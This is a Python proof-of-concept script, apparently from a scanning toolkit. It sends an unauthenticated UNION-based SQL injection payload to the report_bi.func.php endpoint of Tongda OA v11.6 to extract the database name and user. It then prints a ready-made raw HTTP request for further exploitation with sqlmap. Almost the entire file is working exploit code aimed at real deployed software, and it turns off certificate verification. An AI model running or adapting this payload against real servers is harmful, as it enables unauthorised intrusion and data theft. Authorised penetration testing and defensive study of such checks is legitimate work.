import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v11_6_report_bi_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    data='''_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&'''
    exp_url=urldata+'general/bi_design/appcenter/report_bi.func.php'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(exp_url, headers=headers, data=data, verify=False)
        if response.status_code == 200 and "用户未登录，请重新登录" not in response.text:
            print(Vcolors.RED + "[+] 可能存在POST_sql注入漏洞" +Vcolors.ENDC)
            print(Vcolors.RED +
            '''[SUCCESS]  使用sqlmap数据包做进一步验证:
            POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
            Host: {}
            User-Agent: Go-http-client/1.1
            Content-Length: 113
            Content-Type: application/x-www-form-urlencoded
            Accept-Encoding: gzip

            _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info& #注点
                       '''.format(url)+Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在通达OA v11.6 report SQL注入漏洞" +Vcolors.ENDC)
    except:
        logging.error("通达OA_v11_6_report_bi_sql脚本出现异常")



